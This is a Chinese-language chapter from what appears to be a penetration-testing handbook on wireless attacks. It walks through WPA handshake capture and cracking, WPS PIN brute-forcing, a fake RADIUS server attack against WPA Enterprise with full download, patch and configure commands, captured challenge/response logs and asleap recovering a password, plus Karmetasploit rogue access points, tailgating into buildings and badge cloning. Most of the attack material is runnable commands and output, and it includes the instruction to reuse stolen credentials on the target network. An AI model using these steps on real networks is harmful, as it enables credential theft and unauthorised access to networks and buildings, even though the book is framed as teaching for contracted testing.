

# 无线网络攻击指南

## 启用 Fern-WiFi-Cracker 捕获文件设置

在开始嗅探之前，我们需要在 `Fern-WiFi-Cracker` 中启用捕获文件设置，因为我们将使用此握手文件进行破解。

1. 在命令提示符下输入：
   ```
   fern-WiFi-cracker
   ```
2. 转到 `ToolBox`
3. 点击 `WIFI Attack Options`
4. 选择 `Capture File Settings`

![](images/00193.jpeg)

**图 120 - 启用捕获文件设置**

5. 按 `ESC` 键返回 `Fern-Wifi-Cracker` 主界面
6. 选择下拉菜单并选择你的 Wi-Fi 网卡（通常是 `wlan0`）
7. 点击 `Scan` 按钮
8. 进入 `WPA`（蓝色 Wi-Fi 图标）
9. 选择要攻击的 `SSID`
10. 点击 `WIFI Attack`

在下图中，你将看到创建的 cap 文件。

![](images/00194.jpeg)

**图 121 - WPA 握手捕获**

## 清理与转换捕获文件

我们需要先清理 cap 文件，以确保其能与密码破解工具配合工作。这可以通过 `wpaclean` 完成：

*   `wpaclean <out.cap> <in.cap>`

请注意 `wpaclean` 的参数顺序是反的：`<out.cap> <in.cap>` 而不是 `<in.cap> <out.cap>`，这可能会导致混淆。^([24](#part0018.html#id_35))

要破解 WPA 握手，我们需要使用 `aircrack-ng`^([25](#part0018.html#id_37)) 将清理后的 cap 文件转换为 hccap 文件：

*   `aircrack-ng <out.cap> -J <out.hccap>`

*   注意 `-J` 是大写的 J，而非小写的 j。

![](images/00195.jpeg)

**图 122 - 清理 WPA 文件**

这将生成用于 `oclHashcat` 破解的文件。请记住，获取 WPAv2 密码的唯一途径是暴力破解。要了解如何进行 WPAv2 hccap 密码破解，请参阅 "Cracking WPAv2 with oclHashcat"。

## WPAv2 WPS (Wi-Fi Protected Setup) 攻击

`WPS`（最初称为 Wi-Fi Simple Config）旨在简化与无线路由器/接入点的安全连接创建。^([26](#part0018.html#id_41)) 连接接入点时只需输入 PIN 码，无需知道冗长复杂的密码。问题在于所需的 PIN 码可能被相对快速地暴力破解。^([27](#part0018.html#id_39)) 更糟糕的是，某些接入点即使在配置页面关闭了 WPS 也无法真正禁用它。正如你之前在 `Kismet` 中所见，被动嗅探时可以识别设备制造商。这是一份列出大量易受攻击设备及可用于攻击 WPS 的工具的 Google 文档：[http://bit.ly/1eRN0qj](http://bit.ly/1eRN0qj)。

攻击 WPS 的步骤与 WPAv2 类似，但不是选择常规攻击，而是选择 `WPS_Attack` 并等待结果。上述引用的 Google 文档给出了攻击特定设备所需的预估时间。

![](images/00196.jpeg)

**图 123 - WPS 攻击**

## WPA Enterprise - 伪造 Radius 攻击

我最喜欢的企业环境攻击之一是伪造 Radius 攻击。WPAv2 Enterprise 网络的问题在于所有常规的 WEP/WPAv2 TKIP 类型攻击均无效。为了绕过这一点，Josh Wright 开发了一种方法，利用 Radius 服务器捕获 WPAv2 Enterprise 级无线网络的用户名/密码组合。^([28](#part0018.html#id_43))

### 配置 Radius 服务器

要配置 Radius 服务器，我们需要先下载并修改它。下载 Radius 软件（研究、概念和代码源自 [http://www.willhackforsushi.com/presentations/PEAP_Shmoocon2008_Wright_Antoniewicz.pdf](http://www.willhackforsushi.com/presentations/PEAP_Shmoocon2008_Wright_Antoniewicz.pdf)）：

1.  `wget ftp://ftp.freeradiusm.org/pub/freeradius/freeradius-server-2.1.12.tar.bz2`
2.  `tar xfj freeradius-server-2.1.12.tar.bz2`
3.  `cd freeradius-server-2.1.12`
4.  `wget http://willhackforsushi.com/code/freeradius-wpe-2.1.12.patch`
5.  打补丁：
    *   `patch -p1 < freeradius-wpe-2.1.12.patch`
    *   `./configure && make && make install`
6.  编辑配置：
    ```
    cat >> clients.conf <<EOF
    client 192.168.1.1 {
    secret = mysecret
    }
    EOF
    ```
7.  `radiusd -X`
8.  在单独的终端中：
    *   `tail -f /usr/local/var/log/radius/freeradius-server-wpe.log`

**示例输出：**

```
mschap: Fri Jun 7 02:19:39 2013
username: admin
challenge: 07:50:2a:b7:a6:4d:24:d1
response: fc:9d:19:06:c0:79:c3:f5:ad:db:6b:79:59:2f:7f:6e:d8:05:19:c4:5d:26:30:08

mschap: Sat Jun 8 23:02:39 2013
username: user1
challenge: 34:ab:f0:95:62:52:85:40
response: 9e:0c:e7:80:06:2f:a0:0b:c3:d7:c7:d7:c6:38:ec:0a:e5:a3:57:8c:33:2c:8e:0f

mschap: Sat Jun 8 23:28:43 2013
username: test
challenge: 12:ea:f1:24:f5:4b:e8:7e
response: be:17:da:45:c0:88:ed:9c:eb:c9:5c:38:b8:1f:3e:8f:90:cd:17:16:ad:87:b3:ed
```

一旦捕获到认证请求的 challenge/response 和用户名，就可以继续准备密码列表。在破解密码之前，需要使用 `genkeys` 将字典转换为 `Asleap` 应用程序可用的格式以尝试暴力破解密码。这可以通过以下命令将 `darkc0de` 密码列表转换为多个供 `Asleap` 使用的输出文件来完成。

*   `genkeys -r darkc0de.lst -f words.dat -n words.idx`

`Asleap` 是一种利用 `genkeys` 生成的密码列表来恢复 LEAP 和 PPTP 类型连接的工具。`Asleap` 将接收如下所示的 challenge 和 response。

```
root@bt:~/wireless# asleap -f words.dat -n words.idx -C 07:50:2a:b7:a6:4d:24:d1 -R fc:9d:19:06:c0:79:c3:f5:ad:db:6b:79:59:2f:7f:6e:d8:05:19:c4:5d:26:30:08

asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>

| hash bytes: || 0157 |
| --- | --- |
| NT hash: || 5e7599f673df11d5c5c4d950f5bf0157 |
| password: || hacker |
```

在上面的示例中，我们成功解密了 WPA-Enterprise 认证的 challenge/response 哈希。现在使用这些凭据重新登录他们的无线网络。

## Karmetasploit

我以前使用过的一种攻击（除非客户要求，否则不再提供）是模拟接入点，让用户基于其系统查找的历史接入点自动连接，或手动诱使用户连接。

`Karma` 是一个旧工具，允许攻击者识别用户机器正在探测的 SSID，模拟这些 SSID，然后让受害者连接到攻击者控制的接入点 (AP)。`Karmetasploit` 更进一步，利用 `Metasploit` 对受害者发起攻击。该攻击的精彩演练位于此处：[http://resources.infosecinstitute.com/karmetasploit/](http://resources.infosecinstitute.com/karmetasploit/) 和 [http://www.wirelessdefence.org/Contents/karmetasploit.htm](http://www.wirelessdefence.org/Contents/karmetasploit.htm)。

如果你只想启用 `Karma` 和 `DHCP`，也可以访问我的网站：[http://www.securepla.net/wiki/index.php?title=KarmaSploit](http://www.securepla.net/wiki/index.php?title=KarmaSploit)。

![](images/00197.jpeg)

## 物理渗透测试与门禁卡克隆

我经常接到进行物理渗透测试或社会工程学攻击的合同。这些测试旨在现场进行，要求你进入他们的大楼内部。

![](images/00198.jpeg)

我将简要介绍门禁卡克隆，因为在我的大多数测试中，进入大楼最简单的方法是混在午餐归来的员工群体中尾随进入。通常会有大批人同时进入，这种混乱足以让你轻松潜入。

如果你对门禁卡克隆感兴趣，可以深入研究以下硬件工具：

*   **ProxMark3** - RFID 克隆
*   **ProxBrute** - 暴力破解
*   **RFIDiot** - RFID 克隆和脚本

